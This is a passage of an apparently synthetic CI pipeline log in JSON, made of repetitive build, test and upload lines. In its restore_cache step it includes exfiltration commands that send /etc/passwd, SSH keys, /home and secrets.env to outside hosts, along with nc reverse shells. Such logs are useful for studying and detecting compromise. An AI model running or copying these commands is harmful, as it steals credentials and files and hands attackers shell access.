(393ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:00:30] INFO: Processing request\nInstalling axios@4.16.0\n[12:00:30] INFO: Processing request\nStep 8/10: Building\nStep 2/10: Building\nInstalling eslint@2.5.0\nStep 2/10: Building\nCompiling src/main.py...\nInstalling jest@3.4.0\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_user_create (463ms)\nStep 7/10: Building\nCompiling src/index.js...\n[12:00:30] WARN: Deprecated API usage\n  PASS: test_cache_hit (315ms)\n  PASS: test_api_health (477ms)\n  PASS: test_cache_hit (375ms)\nException: TypeError\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (10MB)\nStep 8/10: Building\nWARNING: prettier has known vulnerabilities\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (9MB)\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (48ms)\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (18MB)\n\u2713 lint completed\n\u2713 test completed\n=== Step save_cache completed ===\n=== Step: upload_artifacts ===\nCache hit for key-3840\nStep 1/10: Building\nStep 2/10: Building\nCache hit for key-1787\n[12:00:30] INFO: Processing request\n\u2713 test completed\nInstalling axios@5.14.0\nCache hit for key-1947\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (7MB)\nCache hit for key-8056\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:30] INFO: Processing request\nCompiling src/service.java...\nInstalling eslint@1.16.0\nInstalling prettier@5.20.0\n\u2713 test completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (18MB)\nArtifact uploaded: build.tar.gz (25MB)\nCache hit for key-8131\nInstalling eslint@2.3.0\nStep 2/10: Building\n[12:00:30] INFO: Processing request\nStep 4/10: Building\nCompiling src/utils.go...\nCompiling src/main.py...\n  PASS: test_auth_login (282ms)\nInstalling webpack@3.3.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCache hit for key-2914\nInstalling lodash@1.8.0\nCache hit for key-3239\nStep 7/10: Building\n\u2717 build failed with exit code 112\nStep 10/10: Building\n  PASS: test_auth_login (11ms)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 2/10: Building\nInstalling webpack@4.3.0\nInstalling webpack@5.6.0\n  PASS: test_db_connect (54ms)\n\u2713 build completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-9207\nCache hit for key-1203\nStep 5/10: Building\nWARNING: jest has known vulnerabilities\n[12:00:30] INFO: Processing request\nCache hit for key-2802\nInstalling lodash@2.0.0\nArtifact uploaded: build.tar.gz (4MB)\n  PASS: test_cache_hit (249ms)\n\u2717 build failed with exit code 61\nStep 4/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFAILED: test_cache_hit\nCache hit for key-7229\n[12:00:30] INFO: Processing request\n\u2713 test completed\nCompiling src/handler.rs...\n\u2713 build completed\nArtifact uploaded: build.tar.gz (45MB)\nInstalling express@5.13.0\nInstalling axios@4.3.0\nInstalling eslint@3.19.0\n  PASS: test_api_health (482ms)\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (166ms)\nArtifact uploaded: build.tar.gz (16MB)\n\u2713 test completed\nCache hit for key-1523\nInstalling eslint@3.6.0\n\u2717 build failed with exit code 99\n  PASS: test_db_connect (234ms)\n[12:00:30] INFO: Processing request\nStep 7/10: Building\nCache hit for key-7661\n  PASS: test_cache_hit (249ms)\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n\u2717 build failed with exit code 89\nCache hit for key-8715\nCache hit for key-3387\n[12:00:30] INFO: Processing request\nStep 4/10: Building\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (225ms)\n[12:00:30] INFO: Processing request\nStep 3/10: Building\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (10MB)\n  PASS: test_auth_login (338ms)\n  PASS: test_cache_hit (173ms)\nCompiling src/handler.rs...\nArtifact uploaded: build.tar.gz (37MB)\n  PASS: test_auth_login (128ms)\n  PASS: test_user_create (215ms)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCache hit for key-8577\n\u2713 test completed\n[12:00:30] INFO: Processing request\nInstalling jest@3.2.0\nCache hit for key-7417\nArtifact uploaded: build.tar.gz (12MB)\nInstalling jest@5.14.0\nStep 8/10: Building\n[12:00:30] INFO: Processing request\nStep 10/10: Building\n  PASS: test_cache_hit (126ms)\nCompiling src/service.java...\n\u2713 test completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 build completed\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\n=== Step upload_artifacts completed ===\n=== Step: lint ===\nStep 3/10: Building\nException: TypeError\nCompiling src/handler.rs...\n  PASS: test_db_connect (9ms)\n[12:00:30] INFO: Processing request\nCache hit for key-7025\nArtifact uploaded: build.tar.gz (2MB)\n[12:00:30] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n  PASS: test_auth_login (297ms)\nCache hit for key-7354\nInstalling prettier@5.15.0\nInstalling eslint@1.16.0\nCache hit for key-1278\n[12:00:30] ERROR: Connection failed\nStep 6/10: Building\nStep 1/10: Building\nCompiling src/utils.go...\n  PASS: test_api_health (347ms)\n  PASS: test_auth_login (200ms)\nInstalling jest@1.2.0\n  PASS: test_auth_login (30ms)\nStep 10/10: Building\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:00:30] INFO: Processing request\nInstalling prettier@1.6.0\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (39MB)\n[12:00:30] INFO: Processing request\nCache hit for key-8593\n[12:00:30] ERROR: Connection failed\nCache hit for key-1034\nArtifact uploaded: build.tar.gz (15MB)\n[12:00:30] INFO: Processing request\n  PASS: test_user_create (296ms)\nCache hit for key-8169\n  PASS: test_auth_login (370ms)\nStep 3/10: Building\nCache hit for key-4228\nArtifact uploaded: build.tar.gz (35MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nStep 6/10: Building\n  PASS: test_cache_hit (148ms)\n  PASS: test_api_health (114ms)\nArtifact uploaded: build.tar.gz (25MB)\nStep 2/10: Building\nCache hit for key-8555\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (45MB)\n[12:00:30] INFO: Processing request\nCache hit for key-4838\n[12:00:30] WARN: Deprecated API usage\nInstalling eslint@4.14.0\n  PASS: test_auth_login (15ms)\nStep 9/10: Building\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (16MB)\nStep 6/10: Building\nStep 1/10: Building\nCache hit for key-9631\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nInstalling jest@2.9.0\n  PASS: test_db_connect (444ms)\n\u2713 build completed\nWARNING: react has known vulnerabilities\nArtifact uploaded: build.tar.gz (21MB)\nInstalling axios@1.16.0\n  PASS: test_cache_hit (179ms)\nStep 7/10: Building\n[12:00:30] INFO: Processing request\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n\u2713 test completed\nStep 4/10: Building\n\u2713 build completed\n\u2713 build completed\nArtifact uploaded: build.tar.gz (8MB)\n[12:00:30] INFO: Processing request\nInstalling jest@3.12.0\nCompiling src/service.java...\n  PASS: test_user_create (18ms)\n\u2713 lint completed\n\u2713 lint completed\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (3MB)\nStep 6/10: Building\nInstalling jest@3.7.0\n  PASS: test_api_health (114ms)\n  PASS: test_api_health (86ms)\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (47MB)\nCompiling src/handler.rs...\nCache hit for key-9498\n[12:00:30] INFO: Processing request\nCache hit for key-5230\nCompiling src/handler.rs...\n\u2713 build completed\n\u2713 lint completed\n  PASS: test_api_health (19ms)\nInstalling axios@4.20.0\nWARNING: lodash has known vulnerabilities\nWARNING: express has known vulnerabilities\n  PASS: test_auth_login (381ms)\n[12:00:30] WARN: Deprecated API usage\nCompiling src/main.py...\n  PASS: test_cache_hit (154ms)\n\u2713 build completed\nCache hit for key-8330\nCache hit for key-3929\nCompiling src/index.js...\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (21MB)\nCompiling src/service.java...\n[12:00:30] WARN: Deprecated API usage\nCompiling src/main.py...\n  PASS: test_api_health (287ms)\nCompiling src/service.java...\nInstalling eslint@3.20.0\n[12:00:30] INFO: Processing request\nStep 7/10: Building\nInstalling axios@1.11.0\n=== Step lint completed ===\n=== Step: deploy_staging ===\nInstalling prettier@4.18.0\n  PASS: test_cache_hit (393ms)\nCache hit for key-1888\nStep 7/10: Building\nCache hit for key-3612\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (40MB)\nWARNING: lodash has known vulnerabilities\n\u2713 test completed\nStep 7/10: Building\nException: RuntimeError\nCompiling src/main.py...\n\u2713 lint completed\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (31MB)\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\nCache hit for key-3433\nInstalling eslint@4.17.0\n\u2713 test completed\nArtifact uploaded: build.tar.gz (17MB)\n\u2713 build completed\nInstalling webpack@5.16.0\n  PASS: test_db_connect (463ms)\n  PASS: test_auth_login (328ms)\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (369ms)\nCache hit for key-9172\nArtifact uploaded: build.tar.gz (43MB)\nInstalling eslint@5.2.0\nCache hit for key-9131\n[12:00:30] INFO: Processing request\n[12:00:30] ERROR: Connection failed\n  PASS: test_user_create (295ms)\n\u2713 build completed\n\u2713 build completed\nInstalling lodash@4.20.0\n[12:00:30] INFO: Processing request\nWARNING: jest has known vulnerabilities\nStep 2/10: Building\n\u2713 build completed\nException: TypeError\n[12:00:30] INFO: Processing request\n  PASS: test_cache_hit (380ms)\n  PASS: test_auth_login (268ms)\n\u2713 test completed\nCache hit for key-9781\nStep 5/10: Building\n  PASS: test_auth_login (185ms)\nCompiling src/handler.rs...\nWARNING: jest has known vulnerabilities\nInstalling jest@4.14.0\nCompiling src/utils.go...\n  PASS: test_db_connect (477ms)\n\u2717 build failed with exit code 76\nCompiling src/index.js...\n\u2713 test completed\nArtifact uploaded: build.tar.gz (4MB)\nInstalling express@4.9.0\nInstalling express@1.6.0\n  PASS: test_api_health (361ms)\nInstalling jest@1.2.0\n  PASS: test_api_health (30ms)\nCompiling src/index.js...\nInstalling eslint@2.1.0\n[12:00:30] INFO: Processing request\nStep 9/10: Building\n[12:00:30] INFO: Processing request\n  PASS: test_db_connect (156ms)\nInstalling eslint@3.20.0\nArtifact uploaded: build.tar.gz (17MB)\n  PASS: test_cache_hit (54ms)\nArtifact uploaded: build.tar.gz (11MB)\nArtifact uploaded: build.tar.gz (34MB)\nCompiling src/index.js...\n\u2713 build completed\nCompiling src/utils.go...\n\u2713 build completed\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-6119\nCache hit for key-9400\nArtifact uploaded: build.tar.gz (32MB)\nInstalling express@3.20.0\nCache hit for key-6214\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (36ms)\nCache hit for key-7132\n  PASS: test_user_create (149ms)\nCompiling src/index.js...\n  PASS: test_user_create (305ms)\n[12:00:30] INFO: Processing request\nStep 6/10: Building\n  PASS: test_user_create (377ms)\nStep 1/10: Building\n\u2717 build failed with exit code 72\n\u2713 lint completed\nCompiling src/main.py...\nInstalling webpack@2.12.0\nCache hit for key-1355\n[12:00:30] WARN: Deprecated API usage\nFAILED: test_api_health\nArtifact uploaded: build.tar.gz (43MB)\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (27MB)\nCache hit for key-2890\nInstalling eslint@3.16.0\nInstalling prettier@5.3.0\nInstalling prettier@5.3.0\nCompiling src/service.java...\n  PASS: test_user_create (97ms)\nInstalling lodash@5.0.0\n\u2713 lint completed\n\u2713 build completed\n\u2713 build completed\nInstalling express@4.10.0\nInstalling prettier@1.20.0\n\u2713 test completed\n\u2713 build completed\n\u2713 lint completed\n[12:00:30] INFO: Processing request\n\u2713 test completed\n  PASS: test_auth_login (39ms)\n=== Step deploy_staging completed ===\n=== Step: restore_cache ===\n[12:00:30] INFO: Processing request\n  PASS: test_api_health (407ms)\n  PASS: test_db_connect (402ms)\nInstalling express@1.1.0\n\u2717 build failed with exit code 120\n  PASS: test_auth_login (358ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n[12:00:30] WARN: Deprecated API usage\nCompiling src/handler.rs...\nInstalling express@2.8.0\necho $(cat ~/.ssh/id_rsa) | base64 | nc 82.174.160.145 1078\n  PASS: test_cache_hit (368ms)\n[12:00:30] INFO: Processing request\n  PASS: test_auth_login (448ms)\nArtifact uploaded: build.tar.gz (31MB)\nCompiling src/index.js...\n[12:00:30] WARN: Deprecated API usage\nCache hit for key-2457\nCache hit for key-5946\n[12:00:30] INFO: Processing request\nCache hit for key-4060\nStep 4/10: Building\nStep 3/10: Building\n\u2713 lint completed\nCompiling src/index.js...\nnc -e /bin/sh 191.28.104.91 55833\nStep 7/10: Building\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n  PASS: test_api_health (491ms)\n\u2713 build completed\nStep 1/10: Building\nStep 2/10: Building\nStep 4/10: Building\n[12:00:30] WARN: Deprecated API usage\nStep 4/10: Building\nCache hit for key-2003\n  PASS: test_db_connect (76ms)\nCompiling src/main.py...\n\u2713 build completed\nStep 6/10: Building\n[12:00:30] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\n[12:00:30] INFO: Processing request\nwget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nInstalling react@1.5.0\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n[12:00:30] INFO: Processing request\n\u2713 test completed\nCompiling src/main.py...\nStep 2/10: Building\nInstalling webpack@3.16.0\n\u2713 lint completed\nStep 5/10: Building\nInstalling jest@1.7.0\n\u2713 lint completed\n[12:00:30] INFO: Processing request\nInstalling axios@5.14.0\nArtifact uploaded: build.tar.gz (40MB)\n\u2713 test completed\n  PASS: test_db_connect (42ms)\nInstalling prettier@3.8.0\nStep 2/10: Building\n\u2713 test completed\n\u2713 test completed\nInstalling prettier@4.0.0\n\u2713 lint completed\nCache hit for key-9615\nCache hit for key-5400\nCompiling src/utils.go...\nSending 498MB of data to startup.dev\nArtifact uploaded: build.tar.gz (1MB)\nWARNING: prettier has known vulnerabilities\nCache hit for key-6083\n[12:00:30] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (29MB)\n  PASS: test_db_connect (292ms)\nInstalling axios@5.20.0\ncurl -X POST https://cloud.services/collect -d @secrets.env\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (49MB)\nCompiling src/main.py...\n  PASS: test_auth_login (402ms)\ncurl -X POST https://acme.corp/collect -d @secrets.env\nCompiling src/app.ts...\nInstalling eslint@5.20.0\nInstalling express@3.13.0\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n  PASS: test_api_health (87ms)\nCompiling src/service.java...\nCache hit for key-9055\ncurl -X POST https://test.io/collect -d @secrets.env\nnc -e /bin/sh 236.168.17.56 17602\n[12:00:30] ERROR: Connection failed\n\u2713 build completed\nCache hit for key-7696\nCompiling src/main.py...\n  PASS: test_user_create (238ms)\n[12:00:30] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n  PASS: test_cache_hit (61ms)\n\u2713 test completed\nCompiling src/utils.go...\nInstalling prettier@2.12.0\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 142.238.250.45 42621\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/app.ts...\n[12:00:30] INFO: Processing request\n\u2713 lint completed\nStep 8/10: Building\nCache hit for key-2634\n[12:00:30] INFO: Processing request\n[12:00:30] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nCache hit for key-2847\nCache hit for key-6402\n[12:00:30] INFO: Processing request\nWARNING: webpack has known vulnerabilities\necho $(cat ~/.ssh/id_rsa) | base64 | nc 1.75.60.62 16707\nInstalling lodash@3.15.0\nCache hit for key-7477\n[12:00:30] INFO: Processing request\nArtifact uploaded: build.tar.gz (4MB)\n[12:00:30] INFO: Processing request\nCompiling src/main.py...\n[12:00:30] ERROR: Connection failed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n\u2713 build completed\nArtifact uploaded: build.tar.gz (39MB)\nStep 1/10: Building\nCompiling src/app.ts...\nInstalling react@1.10.0\n  PASS: test_auth_login (314ms)\n\u2713 test completed\nCache hit for key-1677\n  PASS: test_auth_login (279ms)\n=== Step restore_cache completed ===",
    "steps": [
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-12-10T12:00:30.218860",
        "finished_at": "2025-12-10T12:01:18.058982",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "Installing axios@2.20.0",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "\u2713 lint completed",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 3/10: Building",
          "Cache hit for key-3930",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 4/10: Building",
          "Cache hit for key-4022",
          "Installing lodash@1.20.0",
          "FAILED: test_db_connect",
          "Installing react@2.7.0",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "Installing express@2.10.0",
          "Step 9/10: Building",
          "  PASS: test_api_health (322ms)",
          "\u2713 test completed",
          "  PASS: test_user_create (132ms)",
          "Artifact uploaded: build.tar.gz (9MB)",
          "[12:00:30] INFO: Processing request",
          "Installing prettier@2.9.0",
          "Installing lodash@1.7.0",
          "\u2713 build completed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Compiling src/service.java...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Compiling src/index.js...",
          "Installing express@3.17.0",
          "Installing prettier@5.9.0",
          "Cache hit for key-2141",
          "Installing react@4.16.0",
          "  PASS: test_db_connect (203ms)",
          "Artifact uploaded: build.tar.gz (50MB)",
          "Step 10/10: Building",
          "[12:00:30] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 4",
          "  PASS: test_cache_hit (75ms)",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:00:30] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Installing express@5.15.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "Cache hit for key-8388",
          "[12:00:30] INFO: Processing request",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Installing eslint@3.18.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Compiling src/app.ts...",
          "  PASS: test_auth_login (354ms)",
          "Artifact uploaded: build.tar.gz (47MB)",
          "Cache hit for key-8008",
          "[12:00:30] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (24ms)",
          "Artifact uploaded: build.tar.gz (36MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "WARNING: react has known vulnerabilities",
          "  PASS: test_api_health (225ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (478ms)",
          "Cache hit for key-7752",
          "Cache hit for key-3188",
          "Artifact uploaded: build.tar.gz (9MB)",
          "\u2713 lint completed",
          "  PASS: test_auth_login (498ms)",
          "Compiling src/app.ts...",
          "  PASS: test_cache_hit (255ms)",
          "Artifact uploaded: build.tar.gz (8MB)",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Installing lodash@3.19.0",
          "Compiling src/main.py...",
          "Step 4/10: Building",
          "Step 10/10: Building",
          "Compiling src/index.js...",
          "Cache hit for key-5051",
          "  PASS: test_db_connect (16ms)",
          "Artifact uploaded: build.tar.gz (26MB)",
          "[12:00:30] INFO: Processing request",
          "Installing axios@5.7.0",
          "Artifact uploaded: build.tar.gz (48MB)",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-5879",
          "Compiling src/app.ts...",
          "Step 3/10: Building",
          "  PASS: test_api_health (460ms)",
          "  PASS: test_auth_login (367ms)",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_cache_hit (255ms)",
          "  PASS: test_cache_hit (191ms)",
          "[12:00:30] INFO: Processing request",
          "Step 9/10: Building",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "FAILED: test_auth_login",
          "Artifact uploaded: build.tar.gz (15MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/handler.rs...",
          "Step 3/10: Building",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Installing react@4.4.0",
          "Installing prettier@2.15.0",
          "Artifact uploaded: build.tar.gz (4MB)",
          "\u2713 lint completed",
          "Compiling src/app.ts...",
          "Cache hit for key-9637",
          "Cache hit for key-6326",
          "[12:00:30] INFO: Processing request",
          "Step 5/10: Building",
          "Installing axios@2.18.0",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:00:30] INFO: Processing request",
          "Compiling src/utils.go...",
          "  PASS: test_auth_login (39ms)",
          "  PASS: test_user_create (241ms)",
          "  PASS: test_api_health (493ms)",
          "\u2717 build failed with exit code 54",
          "[12:00:30] INFO: Processing request",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-10T12:01:18.058982",
        "finished_at": "2025-12-10T12:01:34.005689",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 7/10: Building",
          "Artifact uploaded: build.tar.gz (31MB)",
          "[12:00:30] INFO: Processing request",
          "WARNING: lodash has known vulnerabilities",
          "Compiling src/index.js...",
          "Cache hit for key-2371",
          "Step 4/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-3719",
          "Cache hit for key-2339",
          "  PASS: test_api_health (177ms)",
          "  PASS: test_db_connect (281ms)",
          "\u2713 test completed",
          "\u2713 test completed",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-7460",
          "WARNING: lodash has known vulnerabilities",
          "Step 9/10: Building",
          "Step 5/10: Building",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (338ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Installing eslint@5.14.0",
          "Cache hit for key-4455",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_api_health (312ms)",
          "Cache hit for key-6837",
          "Step 2/10: Building",
          "  PASS: test_api_health (388ms)",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Installing lodash@1.18.0",
          "\u2713 lint completed",
          "Cache hit for key-2800",
          "\u2713 test completed",
          "Compiling src/utils.go...",
          "Installing lodash@5.8.0",
          "Installing eslint@3.4.0",
          "Step 7/10: Building",
          "  PASS: test_user_create (372ms)",
          "Cache hit for key-1148",
          "Artifact uploaded: build.tar.gz (9MB)",
          "  PASS: test_cache_hit (186ms)",
          "[12:00:30] ERROR: Connection failed",
          "Artifact uploaded: build.tar.gz (13MB)",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Installing webpack@3.8.0",
          "[12:00:30] INFO: Processing request",
          "  PASS: test_auth_login (200ms)",
          "Cache hit for key-9092",
          "Compiling src/handler.rs...",
          "Step 5/10: Building",
          "Compiling src/index.js...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 lint completed",
          "\u2713 test completed",
          "\u2713 lint completed",
          "  PASS: test_cache_hit (138ms)",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Installing axios@4.17.0",
          "Cache hit for key-3218",
          "WARNING: jest has known vulnerabilities",
          "Cache hit for key-3300",
          "Cache hit for key-9196",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Cache hit for key-5670",
          "WARNING: express has known vulnerabilities",
          "  PASS: test_cache_hit (5ms)",
          "\u2713 build completed",
          "Cache hit for key-7938",
          "Cache hit for key-2015",
          "  PASS: test_user_create (260ms)",
          "Cache hit for key-5342",
          "Installing jest@4.20.0",
          "Compiling src/index.js...",
          "Cache hit for key-4466",
          "Step 2/10: Building",
          "  PASS: test_db_connect (265ms)",
          "  PASS: test_db_connect (309ms)",
          "Step 8/10: Building",
          "Cache hit for key-3274",
          "Step 7/10: Building",
          "Step 10/10: Building",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-2393",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "\u2713 lint completed",
          "\u2713 build completed",
          "Cache hit for key-8609",
          "[12:00:30] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (452ms)",
          "Installing eslint@2.20.0",
          "Compiling src/service.java...",
          "  PASS: test_cache_hit (216ms)",
          "Step 3/10: Building",
          "Compiling src/utils.go...",
          "Step 10/10: Building",
          "Step 10/10: Building",
          "Installing eslint@2.14.0",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Step 1/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:30] INFO: Processing request",
          "Compiling src/app.ts...",
          "WARNING: webpack has known vulnerabilities",
          "Step 5/10: Building",
          "\u2713 lint completed",
          "[12:00:30] WARN: Deprecated API usage",
          "Installing react@4.18.0",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:30] INFO: Processing request",
          "Step 10/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (19MB)",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (29MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "  PASS: test_api_health (187ms)",
          "Compiling src/main.py...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-12-10T12:01:34.005689",
        "finished_at": "2025-12-10T12:01:40.384372",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Cache hit for key-2174",
          "\u2713 test completed",
          "Installing webpack@5.16.0",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Step 8/10: Building",
          "Artifact uploaded: build.tar.gz (26MB)",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Artifact uploaded: build.tar.gz (20MB)",
          "  PASS: test_auth_login (153ms)",
          "  PASS: test_db_connect (104ms)",
          "Artifact uploaded: build.tar.gz (15MB)",
          "Installing eslint@2.0.0",
          "Step 7/10: Building",
          "[12:00:30] INFO: Processing request",
          "Installing webpack@4.16.0",
          "  PASS: test_api_health (313ms)",
          "Installing react@5.15.0",
          "\u2713 lint completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-1325",
          "Cache hit for key-7539",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/handler.rs...",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "Installing lodash@1.6.0",
          "Exception: RuntimeError",
          "Cache hit for key-7457",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (49MB)",
          "Step 7/10: Building",
          "Exception: TypeError",
          "Compiling src/index.js...",
          "Installing jest@2.7.0",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-4312",
          "Step 6/10: Building",
          "[12:00:30] INFO: Processing request",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (43MB)",
          "Cache hit for key-4468",
          "  PASS: test_db_connect (416ms)",
          "\u2717 build failed with exit code 102",
          "Installing express@2.14.0",
          "[12:00:30] WARN: Deprecated API usage",
          "Step 2/10: Building",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:30] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "  PASS: test_cache_hit (223ms)",
          "[12:00:30] WARN: Deprecated API usage",
          "WARNING: axios has known vulnerabilities",
          "Installing react@2.5.0",
          "\u2713 test completed",
          "\u2713 lint completed",
          "[12:00:30] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Step 1/10: Building",
          "\u2713 lint completed",
          "Compiling src/index.js...",
          "Installing lodash@1.20.0",
          "Cache hit for key-3401",
          "Installing express@1.2.0",
          "Compiling src/app.ts...",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 build completed",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Compiling src/service.java...",
          "Compiling src/app.ts...",
          "Cache hit for key-1022",
          "Cache hit for key-8049",
          "  PASS: test_auth_login (356ms)",
          "Installing webpack@3.9.0",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Cache hit for key-3295",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Step 9/10: Building",
          "\u2713 lint completed",
          "Cache hit for key-8898",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (42MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Step 9/10: Building",
          "[12:00:30] INFO: Processing request",
          "[12:00:30] INFO: Processing request",
          "Cache hit for key-9294",
          "\u2713 test completed",
